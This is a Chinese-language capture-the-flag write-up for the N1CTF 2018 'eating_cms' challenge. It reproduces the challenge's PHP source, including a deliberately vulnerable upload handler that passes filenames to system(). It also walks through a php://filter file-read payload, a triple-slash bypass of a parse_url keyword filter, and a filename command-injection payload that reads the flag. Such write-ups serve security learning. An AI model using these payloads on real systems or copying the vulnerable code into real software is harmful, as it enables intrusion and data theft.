---
title: '[N1CTF 2018]eating_cms'
date: 2024-08-10 21:27:38
tags:
     - 题解
     - cms
categories: 刷题笔记
---

### [N1CTF 2018]eating_cms

打开页面，是个登录框，我们首先想到sql注入，但尝试了多次后没啥效果，我们进行抓包看看

![image-20240811214053859](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112140065.png)

发现了一个sql语句，测试之后发现很难绕过，我们访问register.php进行注册

注册登录后，我们发现了一个网页

<!--m>

![image-20240811214253847](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112142337.png)

观察网页的url，我们尝试用伪协议来读取源码

```
http://a0dfe74c-60ea-4eaa-bef4-7426c35d7048.node5.buuoj.cn:81/user.php?page=php://filter/convert.base64-encode/resource=user
```

得到user.php的源码

```
<?php
require_once("function.php");
if( !isset( $_SESSION['user'] )){
    Header("Location: index.php");

}
if($_SESSION['isadmin'] === '1'){
    $oper_you_can_do = $OPERATE_admin;
}else{
    $oper_you_can_do = $OPERATE;
}
//die($_SESSION['isadmin']);
if($_SESSION['isadmin'] === '1'){
    if(!isset($_GET['page']) || $_GET['page'] === ''){
        $page = 'info';
    }else {
        $page = $_GET['page'];
    }
}
else{
    if(!isset($_GET['page'])|| $_GET['page'] === ''){
        $page = 'guest';
    }else {
        $page = $_GET['page'];
        if($page === 'info')
        {
//            echo("<script>alert('no premission to visit info, only admin can, you are guest')</script>");
            Header("Location: user.php?page=guest");
        }
    }
}
filter_directory();
//if(!in_array($page,$oper_you_can_do)){
//    $page = 'info';
//}
include "$page.php";
?>

```

我们再读取function.php的源码

```
<?php
session_start();
require_once "config.php";
function Hacker()
{
    Header("Location: hacker.php");
    die();
}


function filter_directory()
{
    $keywords = ["flag","manage","ffffllllaaaaggg"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function filter_directory_guest()
{
    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function Filter($string)
{
    global $mysqli;
    $blacklist = "information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password";
    $whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><";
    for ($i = 0; $i < strlen($string); $i++) {
        if (strpos("$whitelist", $string[$i]) === false) {
            Hacker();
        }
    }
    if (preg_match("/$blacklist/is", $string)) {
        Hacker();
    }
    if (is_string($string)) {
        return $mysqli->real_escape_string($string);
    } else {
        return "";
    }
}

function sql_query($sql_query)
{
    global $mysqli;
    $res = $mysqli->query($sql_query);
    return $res;
}

function login($user, $pass)
{
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
    if ($res->num_rows) {
        $data = $res->fetch_array();
        $_SESSION['user'] = $data[username_which_you_do_not_know];
        $_SESSION['login'] = 1;
        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];
        return true;
    } else {
        return false;
    }
    return;
}

function updateadmin($level,$user)
{
    $sql = "update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' ";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
//    die($res);
    if ($res == 1) {
        return true;
    } else {
        return false;
    }
    return;
}

function register($user, $pass)
{
    global $mysqli;
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')";
    $res = sql_query($sql);
    return $mysqli->insert_id;
}

function logout()
{
    session_destroy();
    Header("Location: index.php");
}

?>


```

我们发现不能直接读取到flag文件，这里用parse_url解析漏洞绕过

parse_url:
`本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。 本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。`

```
$keywords = ["flag","manage","ffffllllaaaaggg","info"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
```

测试一下：

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/7be16183649c0f628864d3cd366c42cd.png)

结果

```
array(3) { ["host"]=> string(9) "127.0.0.1" ["path"]=> string(9) "/user.php" ["query"]=> string(69) "page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg" }

```

再看看`$_SERVER['REQUEST_URI']`的返回值。

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/f1a63519eb0b1b07f07a6da67af26f57.png)

结果
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/6fc12e1b6776ebc85f92c48bc8b2ad9f.png)

题目源码的意思是对$_SERVER[‘REQUEST_URI’]进行parse_url解析。
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/5b812582f9d7553587b9719d5b70819f.png)

用伪协议直接读ffffllllaaaaggg会被检测到

`有一个办法是使parse_url解析出错，从而无法进入下面的foreach判断。`
只要在user.php前面加上三个/

![image-20240811220013961](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112200085.png)

得到

```
<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly");
}else {
    echo "you can find sth in m4aaannngggeee";
}
?>

```

我们访问m4aaannngggeee

```
<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly");
}
include "templates/upload.html";

?>

```

我们进入templates/upload.html页面

![image-20240811220200390](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112202670.png)

我们在源码里发现另一个php文件

![image-20240811220300834](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112203865.png)

我们用伪协议读取

```
<?php
$allowtype = array("gif","png","jpg");
$size = 10000000;
$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
$filename = $_FILES['file']['name'];
if(is_uploaded_file($_FILES['file']['tmp_name'])){
    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
        die("error:can not move");
    }
}else{
    die("error:not an upload file！");
}
$newfile = $path.$filename;
echo "file upload success<br />";
echo $filename;
$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
echo "<img src='data:image/png;base64,".$picdata."'></img>";
if($_FILES['file']['error']>0){
    unlink($newfile);
    die("Upload file error: ");
}
$ext = array_pop(explode(".",$_FILES['file']['name']));
if(!in_array($ext,$allowtype)){
    unlink($newfile);
}
?>

```

没有任何过滤，非常明显的文件名代码执行漏洞，接着就是找到真正的上传点
在根据细节回顾的时候，找到上传点`/user.php?page=m4aaannngggeee`

![image-20240811220855712](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112208767.png)

用filename进行命令执行

传文件抓包，修改文件名。

过滤了 /

所以最后payload

```
;cd ..;cat flag_233333;#
```

![image-20240811221223432](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202408112212622.png)
